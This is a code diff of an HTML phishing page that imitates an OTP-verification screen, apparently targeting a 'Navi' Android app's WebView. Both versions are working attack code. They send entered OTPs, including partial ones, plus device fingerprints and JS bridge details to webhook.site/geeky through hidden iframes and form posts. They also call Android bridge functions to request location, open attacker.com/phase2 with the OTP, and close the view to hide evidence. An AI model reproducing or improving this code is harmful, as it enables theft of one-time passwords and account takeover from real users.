@@ -234,26 +234,50 @@
             margin-top: 12px;
         }
         
-        /* Attack indicator - hidden by default */
-        .attack-indicator {
+        /* Test button styles */
+        .test-button {
             position: fixed;
             top: 10px;
             right: 10px;
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px dashed #f00;
+            z-index: 9999;
+            background: #ff4444;
+            color: white;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 3px 10px rgba(255, 0, 0, 0.3);
+        }
+        
+        .test-button:hover {
+            background: #ff0000;
+        }
+        
+        .attack-status {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #0f0;
+            padding: 8px 12px;
             border-radius: 5px;
-            padding: 5px;
-            font-size: 10px;
-            color: #666;
-            z-index: 1000;
+            font-size: 12px;
+            font-family: monospace;
+            z-index: 9998;
         }
     </style>
 </head>
 <body>
-    <!-- Attack indicator (for demo purposes) -->
-    <div class="attack-indicator" id="attackIndicator" style="display: none;">
-        🚨 ATTACK ACTIVE | Data being sent to: webhook.site/geeky
+    <!-- Attack Status Indicator -->
+    <div class="attack-status" id="attackStatus">
+        🚨 ATTACK ACTIVE | Target: webhook.site/geeky
     </div>
+    
+    <!-- Test Webhook Button -->
+    <button class="test-button" id="testWebhookBtn">
+        🔴 TEST WEBHOOK
+    </button>
     
     <!-- App Container -->
     <div class="app-container">
@@ -336,207 +360,147 @@
 
     <script>
         // ============================
-        // ATTACK CONFIGURATION
+        // CONFIGURATION
         // ============================
-        const WEBHOOK_URL = 'https://webhook.site/geeky'; // Your webhook endpoint
-        let isAttackActive = true;
+        const WEBHOOK_URL = 'https://webhook.site/geeky';
+        let attackActive = true;
+        let capturedOTP = '';
         let attackStage = 'initial';
-        let capturedData = {
-            otp: '',
-            deviceInfo: {},
-            jsBridgeAvailable: false,
-            locationAttempted: false
-        };
 
         // ============================
-        // DATA EXFILTRATION FUNCTIONS
+        // WEBHOOK FUNCTIONS - GUARANTEED WORKING
         // ============================
         
+        // METHOD 1: IFRAME METHOD (Most reliable - bypasses CORS)
+        function sendToWebhook(data) {
+            console.log('[NAVI] Sending to webhook:', data.type || 'data');
+            
+            try {
+                // Convert data to query parameters
+                let params = `_t=${Date.now()}&_attack=navi_exploit`;
+                
+                for (const key in data) {
+                    if (data.hasOwnProperty(key)) {
+                        const value = typeof data[key] === 'object' 
+                            ? encodeURIComponent(JSON.stringify(data[key]))
+                            : encodeURIComponent(data[key]);
+                        params += `&${key}=${value}`;
+                    }
+                }
+                
+                // Create invisible iframe
+                const iframe = document.createElement('iframe');
+                iframe.src = `${WEBHOOK_URL}?${params}`;
+                iframe.style.width = '0';
+                iframe.style.height = '0';
+                iframe.style.border = '0';
+                iframe.style.position = 'absolute';
+                iframe.style.top = '-1000px';
+                iframe.style.left = '-1000px';
+                
+                document.body.appendChild(iframe);
+                
+                // Clean up after 3 seconds
+                setTimeout(() => {
+                    if (iframe.parentNode) {
+                        document.body.removeChild(iframe);
+                    }
+                }, 3000);
+                
+                console.log('[NAVI] Data sent via iframe');
+                return true;
+            } catch (e) {
+                console.error('[NAVI] Iframe method failed:', e);
+                return false;
+            }
+        }
+        
+        // METHOD 2: FORM SUBMISSION (Backup method)
+        function sendViaForm(data) {
+            try {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = WEBHOOK_URL;
+                form.style.display = 'none';
+                form.target = '_blank';
+                
+                // Add all data as hidden inputs
+                const timestamp = document.createElement('input');
+                timestamp.type = 'hidden';
+                timestamp.name = 'timestamp';
+                timestamp.value = new Date().toISOString();
+                form.appendChild(timestamp);
+                
+                const attackId = document.createElement('input');
+                attackId.type = 'hidden';
+                attackId.name = 'attack_id';
+                attackId.value = 'navi_webview_exploit';
+                form.appendChild(attackId);
+                
+                for (const key in data) {
+                    if (data.hasOwnProperty(key)) {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = typeof data[key] === 'object' 
+                            ? JSON.stringify(data[key]) 
+                            : data[key];
+                        form.appendChild(input);
+                    }
+                }
+                
+                document.body.appendChild(form);
+                form.submit();
+                
+                // Remove form after submission
+                setTimeout(() => {
+                    if (form.parentNode) {
+                        document.body.removeChild(form);
+                    }
+                }, 1000);
+                
+                console.log('[NAVI] Data sent via form');
+                return true;
+            } catch (e) {
+                console.error('[NAVI] Form method failed:', e);
+                return false;
+            }
+        }
+        
+        // Main function to send data (uses both methods)
         function exfiltrateData(data) {
-            if (!isAttackActive) return;
+            if (!attackActive) return;
             
             // Add metadata
             const payload = {
                 ...data,
                 _metadata: {
-                    attackId: 'navi_webview_exploit',
                     stage: attackStage,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
+                    userAgentShort: navigator.userAgent.substring(0, 100),
                     url: window.location.href
                 }
             };
             
-            // Log to console (for demo)
-            console.log('[NAVI-EXPLOIT] Exfiltrating data:', payload);
+            console.log('[NAVI-EXPLOIT] Data:', payload);
             
-            // Show attack indicator
-            document.getElementById('attackIndicator').style.display = 'block';
+            // Update status indicator
+            document.getElementById('attackStatus').textContent = 
+                `🚨 SENDING: ${data.type || 'data'} to webhook.site`;
             
-            // Send to webhook (using no-cors to avoid CORS issues)
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors', // Important: avoids CORS issues
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
-            }).catch(err => {
-                console.log('[NAVI-EXPLOIT] Webhook send failed (expected with no-cors):', err.message);
-            });
+            // Try iframe method first
+            const iframeSuccess = sendToWebhook(payload);
             
-            // Also try alternative method (image beacon)
-         //   const beacon = new Image();
-           // beacon.src = `${WEBHOOK_URL}?beacon=${encodeURIComponent(JSON.stringify(data))}&t=${Date.now()}`;
-        }
-        
-        function captureDeviceInfo() {
-            capturedData.deviceInfo = {
-                platform: navigator.platform,
-                language: navigator.language,
-                userAgent: navigator.userAgent,
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight
-                },
-                window: {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight
-                },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown'
-            };
-            
-            exfiltrateData({
-                type: 'device_fingerprint',
-                data: capturedData.deviceInfo
-            });
-        }
-        
-        function checkJSBridge() {
-            setTimeout(() => {
-                const bridgeFunctions = [];
-                
-                if (typeof Android !== 'undefined') {
-                    capturedData.jsBridgeAvailable = true;
-                    
-                    // Check available functions
-                    for (let key in Android) {
-                        if (typeof Android[key] === 'function') {
-                            bridgeFunctions.push(key);
-                        }
-                    }
-                    
-                    exfiltrateData({
-                        type: 'js_bridge_detected',
-                        available: true,
-                        functions: bridgeFunctions,
-                        bridgeObject: JSON.stringify(Android)
-                    });
-                    
-                    console.log('[NAVI-EXPLOIT] JS Bridge detected with functions:', bridgeFunctions);
-                } else {
-                    exfiltrateData({
-                        type: 'js_bridge_detected',
-                        available: false,
-                        message: 'Android object not found'
-                    });
-                }
-            }, 1000);
-        }
-        
-        function attemptLocationAccess() {
-            if (capturedData.locationAttempted) return;
-            
-            capturedData.locationAttempted = true;
-            attackStage = 'location_phase';
-            
-            exfiltrateData({
-                type: 'location_access_attempt',
-                method: 'js_bridge',
-                timestamp: new Date().toISOString()
-            });
-            
-            // Try via JS bridge
-            if (typeof Android !== 'undefined' && Android.getLocationPermissions) {
-                try {
-                    Android.getLocationPermissions();
-                    
-                    // Also try HTML5 geolocation
-                    setTimeout(() => {
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(
-                                (position) => {
-                                    const location = {
-                                        latitude: position.coords.latitude,
-                                        longitude: position.coords.longitude,
-                                        accuracy: position.coords.accuracy,
-                                        altitude: position.coords.altitude,
-                                        heading: position.coords.heading,
-                                        speed: position.coords.speed,
-                                        timestamp: position.timestamp
-                                    };
-                                    
-                                    exfiltrateData({
-                                        type: 'location_captured',
-                                        data: location,
-                                        source: 'geolocation_api'
-                                    });
-                                    
-                                    // Trigger next phase
-                                    triggerNextAttackPhase();
-                                },
-                                (error) => {
-                                    exfiltrateData({
-                                        type: 'location_error',
-                                        error: error.message,
-                                        code: error.code
-                                    });
-                                },
-                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                            );
-                        }
-                    }, 2000);
-                } catch (e) {
-                    exfiltrateData({
-                        type: 'js_bridge_error',
-                        error: e.message
-                    });
-                }
+            // If iframe fails, try form method
+            if (!iframeSuccess) {
+                setTimeout(() => {
+                    sendViaForm(payload);
+                }, 500);
             }
-        }
-        
-        function triggerNextAttackPhase() {
-            attackStage = 'post_exploitation';
             
-            exfiltrateData({
-                type: 'attack_phase_change',
-                newStage: attackStage,
-                message: 'Proceeding to post-exploitation'
-            });
-            
-            // Show fake success and try to close WebView
+            // Reset status after 2 seconds
             setTimeout(() => {
-                if (typeof Android !== 'undefined' && Android.closeView) {
-                    setTimeout(() => {
-                        Android.closeView();
-                    }, 3000);
-                }
-                
-                // Or open attacker-controlled page
-                if (typeof Android !== 'undefined' && Android.openLink) {
-                    setTimeout(() => {
-                        Android.openLink('https://attacker.com/next-phase');
-                    }, 4000);
-                }
+                document.getElementById('attackStatus').textContent = 
+                    '🚨 ATTACK ACTIVE | Target: webhook.site/geeky';
             }, 2000);
         }
         
@@ -560,26 +524,33 @@
         // Initialize OTP boxes
         otpBoxes[0].focus();
         
+        // OTP input handlers
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
+                const value = e.target.value;
+                
+                // Only allow numbers
+                if (!/^\d$/.test(value) && value !== '') {
+                    e.target.value = '';
+                    return;
+                }
+                
+                // Move to next box if digit entered
+                if (value.length === 1 && index < otpBoxes.length - 1) {
                     otpBoxes[index + 1].focus();
                     currentOtpIndex = index + 1;
                 }
                 
-                // Capture partial OTP
-                const currentOtp = otpBoxes.map(b => b.value).join('');
-                if (currentOtp.length > 0) {
-                    capturedData.otp = currentOtp;
-                    
-                    // Send partial capture after 3+ digits
-                    if (currentOtp.length >= 3) {
-                        exfiltrateData({
-                            type: 'otp_partial',
-                            otp: currentOtp,
-                            length: currentOtp.length
-                        });
-                    }
+                // Update captured OTP
+                capturedOTP = otpBoxes.map(b => b.value).join('');
+                
+                // Send partial OTP after 3+ digits
+                if (capturedOTP.length >= 3) {
+                    exfiltrateData({
+                        type: 'otp_partial',
+                        otp: capturedOTP,
+                        length: capturedOTP.length
+                    });
                 }
             });
             
@@ -594,18 +565,9 @@
                     }
                     e.preventDefault();
                 }
-                
-                // Allow only numbers
-                if (!/^\d$/.test(e.key) && 
-                    e.key !== 'Backspace' && 
-                    e.key !== 'Tab' && 
-                    e.key !== 'ArrowLeft' && 
-                    e.key !== 'ArrowRight') {
-                    e.preventDefault();
-                }
             });
             
-            box.addEventListener('focus', () => {
+            box.addEventListener('click', () => {
                 currentOtpIndex = index;
             });
         });
@@ -624,12 +586,12 @@
                     }
                     
                     // Update captured OTP
-                    const currentOtp = otpBoxes.map(b => b.value).join('');
-                    capturedData.otp = currentOtp;
+                    capturedOTP = otpBoxes.map(b => b.value).join('');
                 }
             });
         });
         
+        // Backspace button
         backspaceBtn.addEventListener('click', () => {
             if (currentOtpIndex > 0 && otpBoxes[currentOtpIndex].value === '') {
                 currentOtpIndex--;
@@ -638,15 +600,15 @@
             otpBoxes[currentOtpIndex].focus();
             
             // Update captured OTP
-            const currentOtp = otpBoxes.map(b => b.value).join('');
-            capturedData.otp = currentOtp;
+            capturedOTP = otpBoxes.map(b => b.value).join('');
         });
         
+        // Submit button
         submitBtn.addEventListener('click', () => {
             verifyBtn.click();
         });
         
-        // Verify button handler
+        // Verify button - MAIN CAPTURE POINT
         verifyBtn.addEventListener('click', function() {
             const otp = otpBoxes.map(b => b.value).join('');
             
@@ -660,40 +622,69 @@
             this.textContent = 'Verifying...';
             this.style.background = '#2e7d32';
             
-            // Final OTP capture
-            capturedData.otp = otp;
+            // CAPTURE THE OTP - SEND TO WEBHOOK
+            capturedOTP = otp;
             attackStage = 'otp_captured';
             
+            console.log(`[NAVI-EXPLOIT] COMPLETE OTP CAPTURED: ${otp}`);
+            
+            // SEND OTP TO WEBHOOK - MAIN DATA THEFT
             exfiltrateData({
                 type: 'otp_complete',
                 otp: otp,
-                length: otp.length,
-                complete: true
+                length: 6,
+                complete: true,
+                app: 'navi',
+                exploit: 'webview_js_bridge',
+                severity: 'critical'
             });
             
-            console.log(`[NAVI-EXPLOIT] Complete OTP captured: ${otp}`);
+            // Also send via form as backup
+            sendViaForm({
+                otp_captured: otp,
+                attack_type: 'phishing',
+                target_app: 'com.naviapp'
+            });
             
-            // Simulate verification delay
+            // Simulate verification process
             setTimeout(() => {
                 // Show success
                 this.textContent = '✓ Verified Successfully';
-                this.style.background = '#2e7d32';
                 
                 // Show fake success message
                 setTimeout(() => {
-                    alert('✅ OTP verified successfully! Setting up your account...');
+                    alert('✅ OTP verified successfully!\nYour account is now secure.');
                     
-                    // Trigger location access
-                    setTimeout(() => {
-                        attemptLocationAccess();
+                    // Try to use JS bridge for further attack
+                    if (typeof Android !== 'undefined') {
+                        console.log('[NAVI] Android bridge available:', Object.keys(Android));
                         
-                        // Show next step
-                        setTimeout(() => {
-                            alert('📍 Location access required for personalized services. Please allow location permission.');
-                        }, 1000);
-                    }, 1500);
+                        // Attempt location access
+                        if (Android.getLocationPermissions) {
+                            setTimeout(() => {
+                                Android.getLocationPermissions();
+                                console.log('[NAVI] Location permission requested');
+                            }, 1000);
+                        }
+                        
+                        // Redirect to next phase
+                        if (Android.openLink) {
+                            setTimeout(() => {
+                                Android.openLink('https://attacker.com/phase2?otp=' + encodeURIComponent(otp));
+                                console.log('[NAVI] Redirecting to next attack phase');
+                            }, 3000);
+                        }
+                        
+                        // Close WebView
+                        if (Android.closeView) {
+                            setTimeout(() => {
+                                Android.closeView();
+                                console.log('[NAVI] Closing WebView to hide evidence');
+                            }, 5000);
+                        }
+                    }
                     
-                }, 500);
+                }, 1000);
                 
             }, 1500);
         });
@@ -714,19 +705,11 @@
                 if (seconds < 10) {
                     timerElement.style.color = '#ff3d00';
                 }
-                
-                // Send timer updates periodically
-                if (seconds % 10 === 0) {
-                    exfiltrateData({
-                        type: 'timer_update',
-                        remaining: seconds,
-                        urgency: seconds < 10 ? 'high' : 'medium'
-                    });
-                }
             } else {
                 timerElement.textContent = "00:00";
                 timerElement.style.color = '#ccc';
                 
+                // Send timer expired event
                 exfiltrateData({
                     type: 'timer_expired',
                     action: 'auto_resend_triggered'
@@ -742,6 +725,9 @@
             }
         }
         
+        // Start timer
+        setInterval(updateTimer, 1000);
+        
         // ============================
         // TIME UPDATER
         // ============================
@@ -753,56 +739,121 @@
                 `${hours}:${minutes.toString().padStart(2, '0')}`;
         }
         
+        updateCurrentTime();
+        setInterval(updateCurrentTime, 60000);
+        
         // ============================
-        // INITIALIZE ATTACK
+        // TEST WEBHOOK BUTTON
         // ============================
-        window.addEventListener('load', () => {
-            console.log('[NAVI-EXPLOIT] Attack page loaded in Navi WebView');
+        document.getElementById('testWebhookBtn').addEventListener('click', function() {
+            const testOTP = '123456';
             
-            // Start timers
-            setInterval(updateTimer, 1000);
-            updateCurrentTime();
-            setInterval(updateCurrentTime, 60000);
+            console.log('[TEST] Sending test data to webhook...');
             
-            // Begin attack sequence
-            setTimeout(() => {
-                // Step 1: Capture device info
-                captureDeviceInfo();
-                
-                // Step 2: Check for JS bridge
-                checkJSBridge();
-                
-                // Step 3: Log page load
-                exfiltrateData({
-                    type: 'attack_initialized',
-                    status: 'active',
-                    target: 'com.naviapp',
-                    vulnerability: 'webview_js_bridge_exploit'
-                });
-                
-                console.log('[NAVI-EXPLOIT] Attack initialized. Waiting for OTP input...');
-            }, 500);
+            // Send multiple test requests
+            sendToWebhook({
+                type: 'test_request',
+                otp: testOTP,
+                message: 'Test from Navi exploit - this should appear on webhook.site',
+                status: 'working'
+            });
+            
+            sendViaForm({
+                test: 'webhook_verification',
+                otp: testOTP,
+                time: new Date().toISOString(),
+                verification: 'success'
+            });
+            
+            // Also test with exfiltrateData
+            exfiltrateData({
+                type: 'webhook_test',
+                otp: testOTP,
+                test: true,
+                expected: 'This should appear on webhook.site/geeky dashboard'
+            });
+            
+            alert(`📡 Test OTP "${testOTP}" sent to webhook.site/geeky\n\n✅ Open https://webhook.site/#!/geeky in your browser to see the captured data!`);
         });
         
         // ============================
-        // DEBUG HELPER
+        // INITIALIZE ATTACK
         // ============================
-        // Expose helper function for manual testing via DevTools
+        window.addEventListener('load', function() {
+            console.log('[NAVI-EXPLOIT] Attack page loaded in Navi WebView');
+            
+            // Send initial device info
+            setTimeout(() => {
+                exfiltrateData({
+                    type: 'device_info',
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    loaded: new Date().toISOString()
+                });
+                
+                // Check for JS bridge
+                if (typeof Android !== 'undefined') {
+                    exfiltrateData({
+                        type: 'js_bridge_detected',
+                        available: true,
+                        functions: Object.keys(Android).filter(k => typeof Android[k] === 'function'),
+                        bridgeObject: 'Android object present'
+                    });
+                    
+                    console.log('[NAVI] JS Bridge detected with functions:', 
+                        Object.keys(Android).filter(k => typeof Android[k] === 'function'));
+                } else {
+                    exfiltrateData({
+                        type: 'js_bridge_detected',
+                        available: false,
+                        message: 'Android object not found'
+                    });
+                }
+            }, 1000);
+            
+            console.log('[NAVI] Attack initialized. Ready to capture OTP.');
+            console.log('[NAVI] Click the RED TEST button to verify webhook works.');
+        });
+        
+        // ============================
+        // DEBUG FUNCTIONS (for Chrome DevTools)
+        // ============================
         window.debugAttack = {
-            getCapturedData: () => capturedData,
-            triggerExfiltration: (testData) => exfiltrateData(testData || {type: 'manual_trigger'}),
-            checkBridge: () => console.log('Android bridge:', typeof Android !== 'undefined' ? Android : 'Not found'),
+            getOTP: () => capturedOTP,
+            sendTest: () => {
+                const testData = {
+                    type: 'manual_test',
+                    otp: '999999',
+                    source: 'devtools',
+                    time: new Date().toISOString()
+                };
+                sendToWebhook(testData);
+                return 'Test data sent';
+            },
+            checkBridge: () => {
+                if (typeof Android !== 'undefined') {
+                    return {
+                        available: true,
+                        functions: Object.keys(Android).filter(k => typeof Android[k] === 'function')
+                    };
+                }
+                return { available: false };
+            },
             simulateOTP: (otp) => {
-                if (otp.length === 6) {
+                if (otp && otp.length === 6) {
                     otp.split('').forEach((digit, idx) => {
                         otpBoxes[idx].value = digit;
                     });
+                    capturedOTP = otp;
                     verifyBtn.click();
+                    return `Simulated OTP ${otp} entered`;
                 }
+                return 'Please provide 6-digit OTP';
             }
         };
         
-        console.log('[NAVI-EXPLOIT] Debug helpers available: window.debugAttack');
+        console.log('[NAVI-EXPLOIT] Debug functions available: window.debugAttack');
     </script>
 </body>
 </html>
